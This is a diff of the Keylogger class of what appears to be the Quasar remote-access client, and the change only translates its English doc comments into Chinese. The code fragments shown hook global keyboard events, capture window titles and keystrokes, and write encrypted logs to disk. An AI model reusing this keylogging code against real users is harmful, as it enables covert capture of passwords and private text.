@@ -17,66 +17,65 @@ using Timer = System.Timers.Timer;
 namespace Quasar.Client.Logging
 {
     /// <summary>
-    /// This class provides keylogging functionality and modifies/highlights the output for
-    /// better user experience.
+    /// 这个类提供键盘记录功能，并修改/高亮输出以提供更好的用户体验。
     /// </summary>
     public class Keylogger : IDisposable
     {
         /// <summary>
-        /// <c>True</c> if the class has already been disposed, else <c>false</c>.
+        /// 如果类已经被释放则为<c>True</c>，否则为<c>false</c>。
         /// </summary>
         public bool IsDisposed { get; private set; }
 
         /// <summary>
-        /// The timer used to periodically flush the <see cref="_logFileBuffer"/> from memory to disk.
+        /// 用于定期将<see cref="_logFileBuffer"/>从内存刷新到磁盘的计时器。
         /// </summary>
         private readonly Timer _timerFlush;
 
         /// <summary>
-        /// The buffer used to store the logged keys in memory.
+        /// 用于在内存中存储记录的按键的缓冲区。
         /// </summary>
         private readonly StringBuilder _logFileBuffer = new StringBuilder();
 
         /// <summary>
-        /// Temporary list of pressed keys while they are being processed.
+        /// 处理按键时的临时按键列表。
         /// </summary>
         private readonly List<Keys> _pressedKeys = new List<Keys>();
 
         /// <summary>
-        /// Temporary list of pressed keys chars while they are being processed.
+        /// 处理按键字符时的临时按键字符列表。
         /// </summary>
         private readonly List<char> _pressedKeyChars = new List<char>();
 
         /// <summary>
-        /// Saves the last window title of an application.
+        /// 保存应用程序的最后窗口标题。
         /// </summary>
         private string _lastWindowTitle = string.Empty;
         
         /// <summary>
-        /// Determines if special keys should be ignored for processing, e.g. when a modifier key is pressed.
+        /// 确定是否应忽略特殊键的处理，例如当按下修饰键时。
         /// </summary>
         private bool _ignoreSpecialKeys;
 
         /// <summary>
-        /// Used to hook global mouse and keyboard events.
+        /// 用于挂钩全局鼠标和键盘事件。
         /// </summary>
         private readonly IKeyboardMouseEvents _mEvents;
 
         /// <summary>
-        /// Provides encryption and decryption methods to securely store log files.
+        /// 提供加密和解密方法以安全存储日志文件。
         /// </summary>
         private readonly Aes256 _aesInstance = new Aes256(Settings.ENCRYPTIONKEY);
 
         /// <summary>
-        /// The maximum size of a single log file.
+        /// 单个日志文件的最大大小。
         /// </summary>
         private readonly long _maxLogFileSize;
 
         /// <summary>
-        /// Initializes a new instance of <see cref="Keylogger"/> that provides keylogging functionality.
+        /// 初始化提供键盘记录功能的<see cref="Keylogger"/>的新实例。
         /// </summary>
-        /// <param name="flushInterval">The interval to flush the buffer from memory to disk.</param>
-        /// <param name="maxLogFileSize">The maximum size of a single log file.</param>
+        /// <param name="flushInterval">将缓冲区从内存刷新到磁盘的间隔。</param>
+        /// <param name="maxLogFileSize">单个日志文件的最大大小。</param>
         public Keylogger(double flushInterval, long maxLogFileSize)
         {
             _maxLogFileSize = maxLogFileSize;
@@ -86,7 +85,7 @@ namespace Quasar.Client.Logging
         }
 
         /// <summary>
-        /// Begins logging of keys.
+        /// 开始记录按键。
         /// </summary>
         public void Start()
         {
@@ -95,7 +94,7 @@ namespace Quasar.Client.Logging
         }
 
         /// <summary>
-        /// Disposes used resources by this class.
+        /// 释放此类使用的资源。
         /// </summary>
         public void Dispose()
         {
@@ -121,7 +120,7 @@ namespace Quasar.Client.Logging
         }
 
         /// <summary>
-        /// Subscribes to all key events.
+        /// 订阅所有按键事件。
         /// </summary>
         private void Subscribe()
         {
@@ -131,7 +130,7 @@ namespace Quasar.Client.Logging
         }
 
         /// <summary>
-        /// Unsubscribes from all key events.
+        /// 取消订阅所有按键事件。
         /// </summary>
         private void Unsubscribe()
         {
@@ -141,11 +140,11 @@ namespace Quasar.Client.Logging
         }
 
         /// <summary>
-        /// Initial handling of the key down events and updates the window title.
+        /// 初始处理按键按下事件并更新窗口标题。
         /// </summary>
-        /// <param name="sender">The sender of  the event.</param>
-        /// <param name="e">The key event args, e.g. the keycode.</param>
-        /// <remarks>This event handler is called first.</remarks>
+        /// <param name="sender">事件的发送者。</param>
+        /// <param name="e">按键事件参数，例如键码。</param>
+        /// <remarks>此事件处理程序首先被调用。</remarks>
         private void OnKeyDown(object sender, KeyEventArgs e)
         {
             string activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
@@ -181,11 +180,11 @@ namespace Quasar.Client.Logging
         }
 
         /// <summary>
-        /// Processes pressed keys and appends them to the <see cref="_logFileBuffer"/>. Processing of Unicode characters starts here.
+        /// 处理按下的按键并将其追加到<see cref="_logFileBuffer"/>。Unicode字符的处理从这里开始。
         /// </summary>
-        /// <param name="sender">The sender of  the event.</param>
-        /// <param name="e">The key press event args, especially the pressed KeyChar.</param>
-        /// <remarks>This event handler is called second.</remarks>
+        /// <param name="sender">事件的发送者。</param>
+        /// <param name="e">按键按下事件参数，特别是按下的KeyChar。</param>
+        /// <remarks>此事件处理程序第二个被调用。</remarks>
         private void OnKeyPress(object sender, KeyPressEventArgs e)
         {
             if (_pressedKeys.ContainsModifierKeys() && _pressedKeys.ContainsKeyChar(e.KeyChar))
@@ -207,11 +206,11 @@ namespace Quasar.Client.Logging
         }
 
         /// <summary>
-        /// Finishes processing of the keys.
+        /// 完成按键的处理。
         /// </summary>
-        /// <param name="sender">The sender of  the event.</param>
-        /// <param name="e">The key event args.</param>
-        /// <remarks>This event handler is called third.</remarks>
+        /// <param name="sender">事件的发送者。</param>
+        /// <param name="e">按键事件参数。</param>
+        /// <remarks>此事件处理程序第三个被调用。</remarks>
         private void OnKeyUp(object sender, KeyEventArgs e)
         {
             _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
@@ -219,21 +218,21 @@ namespace Quasar.Client.Logging
         }
 
         /// <summary>
-        /// Finds a held down key char in a given key char list.
+        /// 在给定的按键字符列表中查找按下的按键字符。
         /// </summary>
-        /// <param name="list">The list of key chars.</param>
-        /// <param name="search">The key char to search for.</param>
-        /// <returns><c>True</c> if the list contains the key char, else <c>false</c>.</returns>
+        /// <param name="list">按键字符列表。</param>
+        /// <param name="search">要搜索的按键字符。</param>
+        /// <returns>如果列表包含按键字符则为<c>True</c>，否则为<c>false</c>。</returns>
         private bool DetectKeyHolding(List<char> list, char search)
         {
             return list.FindAll(s => s.Equals(search)).Count > 1;
         }
 
         /// <summary>
-        /// Adds special highlighting in HTML to the special keys.
+        /// 在HTML中为特殊按键添加特殊高亮。
         /// </summary>
-        /// <param name="keys">The input keys.</param>
-        /// <returns>The highlighted special keys.</returns>
+        /// <param name="keys">输入的按键。</param>
+        /// <returns>高亮的特殊按键。</returns>
         private string HighlightSpecialKeys(Keys[] keys)
         {
             if (keys.Length < 1) return string.Empty;
@@ -309,7 +308,7 @@ namespace Quasar.Client.Logging
         }
 
         /// <summary>
-        /// Writes the logged keys from memory to disk.
+        /// 将记录的按键从内存写入磁盘。
         /// </summary>
         private void WriteFile()
         {
